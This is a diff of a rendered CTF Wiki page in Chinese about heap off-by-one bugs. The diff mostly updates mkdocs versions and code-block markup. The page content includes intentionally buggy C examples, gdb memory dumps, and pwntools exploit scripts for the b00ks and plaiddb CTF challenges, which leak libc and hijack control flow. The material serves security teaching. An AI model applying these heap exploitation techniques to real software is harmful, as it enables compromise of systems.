@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -5016,7 +5016,7 @@
 <li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li>
 </ol>
 <p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check 。</p>
-<div class="codehilite"><pre><span></span>/* consolidate backward */
+<div class="codehilite"><pre><span></span><code>/* consolidate backward */
     if (!prev_inuse(p)) {
       prevsize = prev_size (p);
       size += prevsize;
@@ -5026,10 +5026,10 @@
         malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
       unlink_chunk (av, p);
     }
-</pre></div>
+</code></pre></div>
 
 <h3 id="1">示例 1<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>int my_gets(char *ptr,int size)
+<div class="codehilite"><pre><span></span><code>int my_gets(char *ptr,int size)
 {
     int i;
     for(i=0;i&lt;=size;i++)
@@ -5047,34 +5047,34 @@ int main()
     my_gets(chunk1,16);
     return 0;
 }
-</pre></div>
+</code></pre></div>
 
 <p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</p>
 <blockquote>
 <p>wikipedia:
 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题：</p>
-<div class="codehilite"><pre><span></span>建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？
-</pre></div>
+<div class="codehilite"><pre><span></span><code>建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？
+</code></pre></div>
 
 
 <p>最容易想到的答案 10 是错的。这个栅栏有 10 个间隔，11 条栅栏柱。</p>
 </blockquote>
 <p>我们使用 gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为 16 字节的堆块
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 0x602010:   0x0000000000000000  0x0000000000000000
 0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域
 print 'A'*17
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 0x602010:   0x4141414141414141  0x4141414141414141
 0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div></p>
+</code></pre></div></p>
 <h3 id="2">示例 2<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
 <p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p>
-<div class="codehilite"><pre><span></span>int main(void)
+<div class="codehilite"><pre><span></span><code>int main(void)
 {
     char buffer[40]=&quot;&quot;;
     void *chunk1;
@@ -5088,74 +5088,74 @@ print 'A'*17
     return 0;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。
 但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。
 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>'\x00'</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>'\x00'</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p>
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 0x602010:   0x0000000000000000  0x0000000000000000
 0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk
-</pre></div>
+</code></pre></div>
 
 <p>在我们输入'A'*24 后执行 strcpy</p>
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021
 0x602010:   0x4141414141414141  0x4141414141414141
 0x602020:   0x4141414141414141  0x0000000000000400
-</pre></div>
+</code></pre></div>
 
 <p>可以看到 next chunk 的 size 域低字节被结束符 <code>'\x00'</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。
 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>
-<div class="codehilite"><pre><span></span>DWORD 0x41424344
+<div class="codehilite"><pre><span></span><code>DWORD 0x41424344
 内存  0x44,0x43,0x42,0x41
-</pre></div>
+</code></pre></div>
 
 <h2 id="1-asis-ctf-2016-b00ks">实例 1: Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a><a class="headerlink" href="#1-asis-ctf-2016-b00ks" title="Permanent link">&para;</a></h2>
 <h3 id="_2">题目介绍<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <p>题目是一个常见的选单式程序，功能是一个图书管理系统。</p>
-<div class="codehilite"><pre><span></span>1. Create a book
+<div class="codehilite"><pre><span></span><code>1. Create a book
 2. Delete a book
 3. Edit a book
 4. Print book detail
 5. Change current author name
 6. Exit
-</pre></div>
+</code></pre></div>
 
 <p>程序提供了创建、删除、编辑、打印图书的功能。题目是 64 位程序，保护如下所示。</p>
-<div class="codehilite"><pre><span></span>Canary                        : No
+<div class="codehilite"><pre><span></span><code>Canary                        : No
 NX                            : Yes
 PIE                           : Yes
 Fortify                       : No
 RelRO                         : Full
-</pre></div>
+</code></pre></div>
 
 <p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p>
-<div class="codehilite"><pre><span></span>struct book
+<div class="codehilite"><pre><span></span><code>struct book
 {
     int id;
     char *name;
     char *description;
     int size;
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="create">create<a class="headerlink" href="#create" title="Permanent link">&para;</a></h3>
 <p>book 结构中存在 name 和 description ， name 和 description 在堆上分配。首先分配 name buffer ，使用 malloc ，大小自定但小于 32 。</p>
-<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);
+<div class="codehilite"><pre><span></span><code>printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);
 __isoc99_scanf(&quot;%d&quot;, &amp;size);
 printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);
 ptr = malloc(size);
-</pre></div>
+</code></pre></div>
 
 <p>之后分配 description ，同样大小自定但无限制。</p>
-<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);
+<div class="codehilite"><pre><span></span><code>printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);
         __isoc99_scanf(&quot;%d&quot;, &amp;size);
 
 v5 = malloc(size);
-</pre></div>
+</code></pre></div>
 
 <p>之后分配 book 结构的内存</p>
-<div class="codehilite"><pre><span></span>book = malloc(0x20uLL);
+<div class="codehilite"><pre><span></span><code>book = malloc(0x20uLL);
 if ( book )
 {
     *((_DWORD *)book + 6) = size;
@@ -5165,11 +5165,11 @@ if ( book )
     *(_DWORD *)book = ++unk_202024;
     return 0LL;
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="_3">漏洞<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p>
-<div class="codehilite"><pre><span></span>signed __int64 __fastcall my_read(_BYTE *ptr, int number)
+<div class="codehilite"><pre><span></span><code>signed __int64 __fastcall my_read(_BYTE *ptr, int number)
 {
   int i; // [rsp+14h] [rbp-Ch]
   _BYTE *buf; // [rsp+18h] [rbp-8h]
@@ -5190,20 +5190,20 @@ if ( book )
   *buf = 0;
   return 0LL;
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="_4">利用<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <h4 id="_5">泄漏<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
 <p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 '\x00' 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 '\x00' ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p>
-<div class="codehilite"><pre><span></span>0x555555756040: 0x6161616161616161  0x6161616161616161
+<div class="codehilite"><pre><span></span><code>0x555555756040: 0x6161616161616161  0x6161616161616161
 0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name
 0x555555756060: 0x0000555555757480 &lt;== pointer array    0x0000000000000000
 0x555555756070: 0x0000000000000000  0x0000000000000000
 0x555555756080: 0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <p>为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。</p>
-<div class="codehilite"><pre><span></span>io.recvuntil(&#39;Enter author name:&#39;) # input author name
+<div class="codehilite"><pre><span></span><code>io.recvuntil(&#39;Enter author name:&#39;) # input author name
 io.sendline(&#39;a&#39; * 32)
 
 io.recvuntil(&#39;&gt;&#39;) # create book1
@@ -5224,12 +5224,12 @@ io.recvuntil(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1
 book1_addr = io.recv(6)
 book1_addr = book1_addr.ljust(8,&#39;\x00&#39;)
 book1_addr = u64(book1_addr)
-</pre></div>
+</code></pre></div>
 
 <h4 id="off-by-one_3">off-by-one 覆盖指针低字节<a class="headerlink" href="#off-by-one_3" title="Permanent link">&para;</a></h4>
 <p>程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 pointer array 第一个项的低字节。</p>
 <p>覆盖掉 book1 指针的低字节后，这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book 结构，这个 book 结构的 description 和 name 指针可以由直接控制。</p>
-<div class="codehilite"><pre><span></span>def off_by_one(addr):
+<div class="codehilite"><pre><span></span><code>def off_by_one(addr):
     addr += 58
     io.recvuntil(&#39;&gt;&#39;)# create fake book in description
     io.sendline(&#39;3&#39;)
@@ -5242,7 +5242,7 @@ book1_addr = u64(book1_addr)
     io.sendline(&#39;5&#39;)
     io.recvuntil(&#39;Enter author name:&#39;)
     io.sendline(&#39;a&#39; * 32) # &lt;== off-by-one
-</pre></div>
+</code></pre></div>
 
 <p>这里在 description 中伪造了 book ，使用的数据是 p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 。
 其中 addr+58 是为了使指针指向 book2 的指针地址，使得我们可以任意修改这些指针值。</p>
@@ -5250,7 +5250,7 @@ book1_addr = u64(book1_addr)
 <p>通过前面 2 部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写 got 表劫持流程或者写 __malloc_hook 劫持流程等。但是这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此我们还需要想一下其他的办法。</p>
 <p>这道题的巧妙之处在于在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p>
 <p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。
-<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
+<div class="codehilite"><pre><span></span><code>Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/123
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123
 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123
@@ -5268,8 +5268,8 @@ book1_addr = u64(book1_addr)
 0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]
 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-</pre></div></p>
-<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
+</code></pre></div></p>
+<div class="codehilite"><pre><span></span><code>Start              End                Offset             Perm Path
 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/123
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123
 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123
@@ -5287,10 +5287,10 @@ book1_addr = u64(book1_addr)
 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-</pre></div>
+</code></pre></div>
 
 <h4 id="exploit">exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;info&quot;</span>
 
 <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;b00ks&quot;</span><span class="p">)</span>
@@ -5379,13 +5379,13 @@ book1_addr = u64(book1_addr)
 <span class="n">deletebook</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="_7">简洁方案<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
 <p>在任意读写之后，另一种找到 libc 的方案其实是可以在进行任意读写之前首先造成 libc 地址被写在堆上，之后任意读将其读出来即可。</p>
 <p>其中为找到 libc 所在的偏移，可以直接通过 gdb 调试，查看具体 libc 地址在堆上的位置即可，不用进行刻意计算。</p>
 <p>exp 如下：</p>
-<div class="codehilite"><pre><span></span>#! /usr/bin/env python2
+<div class="codehilite"><pre><span></span><code>#! /usr/bin/env python2
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
 
@@ -5508,10 +5508,10 @@ def main():
 
 if __name__ == &#39;__main__&#39;:
     main()
-</pre></div>
+</code></pre></div>
 
 <h2 id="2-plaidctf-2015-plaiddb">实例 2 : plaidctf 2015 plaiddb<a class="headerlink" href="#2-plaidctf-2015-plaiddb" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore
+<div class="codehilite"><pre><span></span><code>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore
 datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>1a031710225e93b0b5985477c73653846c352add, stripped
 ➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> checksec datastore
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore&#39;</span>
@@ -5522,12 +5522,12 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
     PIE:      PIE enabled
     FORTIFY:  Enabled
 ➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>可以看出，该程序是 64 位动态链接的。保护全部开启。</p>
 <h3 id="_8">功能分析<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <p>关键数据结构：</p>
-<div class="codehilite"><pre><span></span>struct Node {
+<div class="codehilite"><pre><span></span><code>struct Node {
     char *key;
     long data_size;
     char *data;
@@ -5536,11 +5536,11 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
     long dummy;
     long dummy1;
 }
-</pre></div>
+</code></pre></div>
 
 <p>主要使用了二叉树的结构来存储数据，具体存储过程其实并不影响利用。</p>
 <p>功能函数需要注意的是 <code>getline</code> (自己实现的单行读取函数):</p>
-<div class="codehilite"><pre><span></span>char *__fastcall getline(__int64 a1, __int64 a2)
+<div class="codehilite"><pre><span></span><code>char *__fastcall getline(__int64 a1, __int64 a2)
 {
   char *v2; // r12
   char *v3; // rbx
@@ -5579,10 +5579,10 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
   *v3 = 0; // &lt;--- 漏洞所在。 off by one （NULL 字节溢出）
   return v2;
 }
-</pre></div>
+</code></pre></div>
 
 <p>几个主要功能：</p>
-<div class="codehilite"><pre><span></span>unsigned __int64 main_fn()
+<div class="codehilite"><pre><span></span><code>unsigned __int64 main_fn()
 {
   char v1[8]; // [rsp+0h] [rbp-18h]
   unsigned __int64 v2; // [rsp+8h] [rbp-10h]
@@ -5614,10 +5614,10 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
   }
   return __readfsqword(0x28u) ^ v2;
 }
-</pre></div>
+</code></pre></div>
 
 <p><code>dump</code> 和 <code>get</code> 都是用来读取内容，这样 <code>key</code> 和具体数据内容都可以读取，不太需要重点关注。重点关注 <code>put</code> 和 <code>del</code>：</p>
-<div class="codehilite"><pre><span></span>__int64 __fastcall cmd_put()
+<div class="codehilite"><pre><span></span><code>__int64 __fastcall cmd_put()
 {
   __int64 v0; // rsi
   Node *row; // rbx
@@ -5671,7 +5671,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
   }
   return result;
 }
-</pre></div>
+</code></pre></div>
 
 <p>分配过程有：</p>
 <ol>
@@ -5697,7 +5697,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 <p>现在我们就需要知道我们需要采用的具体利用方法了。首先 <code>off-by-one</code> 漏洞可以造成堆交叉，可以造成 libc 地址泄露，之后所要采用的利用方法，由于已经存在堆交叉，也就是可以形成 UAF ，可以使用 UAF 的常用方法。</p>
 <p>UAF 漏洞最简单的方法当然是 fastbin attack 了，所以我采用了 fastbin attack。</p>
 <p>到这里，我们就可以开始思考如何形成我们所需要的利用条件。<code>off-by-one</code>最终的效果是可以将一个释放状态的 smallbin chunk 或是 unsortedbin chunk 一直到被溢出 chunk 合并成一个大 chunk。也就是说：</p>
-<div class="codehilite"><pre><span></span>+------------+
+<div class="codehilite"><pre><span></span><code>+------------+
 |            |  &lt;-- free 的 unsortedbin 或是 smallbin chunk （因为此时 fd 和 bk 指向合法指针，才能够进行 unlink）
 +------------+
 |     ...    |  &lt;-- 任意 chunk
@@ -5706,7 +5706,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 +------------+
 |    vuln    |  &lt;-- 被溢出的 chunk，大小为 0x_00 （例如 0x100, 0x200……）
 +------------+
-</pre></div>
+</code></pre></div>
 
 <p>在 <code>off-by-one</code> 利用后，以上出现的 chunk 都将被合并为一个释放状态的 chunk。这样中间任意 chunk 的位置如果是已被分配的，就可以造成 overlap 了。</p>
 <p>按照我们的利用思路，结合题目 <code>getline</code> 函数通过 <code>malloc(8)</code> 再 <code>realloc</code> 的分配方式，我们需要：</p>
@@ -5718,7 +5718,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 <li>进行溢出的 chunk 大小应该属于 unsortedbin 或是 smallbin，不能为 fastbin，否则被释放之后，按照 <code>getline</code> 的分配方式，<code>malloc(8)</code> 无法分配在该位置</li>
 </ol>
 <p>按照以上原则，我们可以思考出 chunk 的分布如下：</p>
-<div class="codehilite"><pre><span></span>+------------+
+<div class="codehilite"><pre><span></span><code>+------------+
 |      1     |  &lt;-- free 的 size == 0x200 chunk
 +------------+
 |      2     |  &lt;-- size == 0x60 fastbin chunk，已被分配，且可以读出数据
@@ -5731,14 +5731,14 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 +------------+
 |      X     |  &lt;-- 任意分配后 chunk 防止 top 合并
 +------------+
-</pre></div>
+</code></pre></div>
 
 <p>由于分配过程还有一些额外结构（结构体本身的分配和 <code>getline</code>），我们需要先释放出足够的 fastbin chunk 来避免结构体本身的分配对我们的过程造成影响。</p>
 <p>在此之后，依次释放掉 5, 3, 1, 之后利用 <code>del</code> 输入时候的 <code>getline</code>，将 3 填满，造成 <code>off-by-one</code>，之后将 4 <code>free</code> 掉进行合并（伪造 <code>prev_size</code>），这样就有了一个交叉的堆结构了。</p>
 <p>之后的过程就更加简单了，首先分配 1 的大小，使得 libc 地址被写到 2 里，就可以泄露出地址，然后将 5 分配出来，写入需要的内容，就可以 fastbin attack 了。</p>
 <h3 id="exploit_1">exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
 <p>由于原 libc 为 2.19 版本，加载有一些奇怪的问题，较为麻烦，而本题没有用到 2.19 独有的特性，所以我采用了 2.23 的 libc 进行调试，版本为 ubuntu10。</p>
-<div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#! /usr/bin/env python2</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="c1"># vim:fenc=utf-8</span>
 
@@ -5847,7 +5847,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
                 
                   
                 
@@ -5948,7 +5948,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5963,7 +5963,7 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
